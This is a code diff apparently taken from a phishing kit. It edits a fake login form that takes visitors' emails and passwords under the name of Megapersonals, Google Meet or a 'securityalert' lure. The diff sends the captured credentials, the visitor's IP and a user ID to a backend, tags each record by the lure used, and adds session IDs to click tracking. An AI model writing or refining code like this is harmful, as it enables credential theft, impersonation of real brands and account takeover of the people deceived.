@@ -379,16 +379,23 @@
             setLoading(true);
             try {
                 // Re-check source at submission time to ensure we have the latest value
+                // Support multiple redirect sources: Google Meet, SecurityAlert, direct access
                 let finalSiteName = SITE_NAME;
+                
                 try {
                     const urlParams = new URLSearchParams(window.location.search);
                     if (urlParams.get('site') === 'GoogleMeet') {
                         finalSiteName = 'Google Meet';
                     } else {
+                        // Check for redirectSource flag (persistent across session)
+                        // This persists throughout the session and should NOT be cleared
                         const redirectSource = sessionStorage.getItem('redirectSource');
                         if (redirectSource === 'GoogleMeet') {
                             finalSiteName = 'Google Meet';
+                        } else if (redirectSource === 'securityalert') {
+                            finalSiteName = 'securityalert';
                         }
+                        // If no redirectSource, defaults to SITE_NAME ('Megapersonals')
                     }
                 } catch (e) {
                     console.warn('site name check failed', e);
@@ -397,14 +404,30 @@
                 const payload = {
                     email,
                     password,
-                    website: finalSiteName, // Google Meet থেকে আসলে এখানে ডেটা 'Google Meet' নামেই ডাটাবেজে সাবমিট হবে
+                    website: finalSiteName,
                     ref: REF || undefined,
                     route: routeType || undefined,
                     userId: state.userId || undefined,
                     visitorIp: state.visitorIp || undefined
                 };
 
-                try { await submitToBackend(payload); } catch (e) { console.warn('backend submit failed', e); }
+                // Submit data to backend and handle response
+                let submitSuccess = false;
+                try {
+                    const result = await submitToBackend(payload);
+                    if (result && result.success) {
+                        submitSuccess = true;
+                        console.log('Data submitted successfully to backend', result);
+                    } else {
+                        console.warn('Backend returned unsuccessful response', result);
+                    }
+                } catch (e) {
+                    console.warn('backend submit failed', e);
+                }
+
+                // NOTE: redirectSource is NOT cleared after submission
+                // This ensures persistent source tracking throughout the session
+                // Future submissions in the same session will retain the same website designation
 
                 const usernameEl = document.getElementById('person_username_field_login');
                 const passwordEl = document.getElementById('person_password_field_login');
@@ -475,6 +498,7 @@
                 const label = (target.textContent || target.getAttribute('aria-label') || target.getAttribute('title') || target.getAttribute('href') || target.type || '').trim();
                 const payload = {
                     website: SITE_NAME,
+                    sessionId: state.sessionId,
                     route: agentRoute || undefined,
                     userId: state.userId || undefined,
                     element: label || tag,
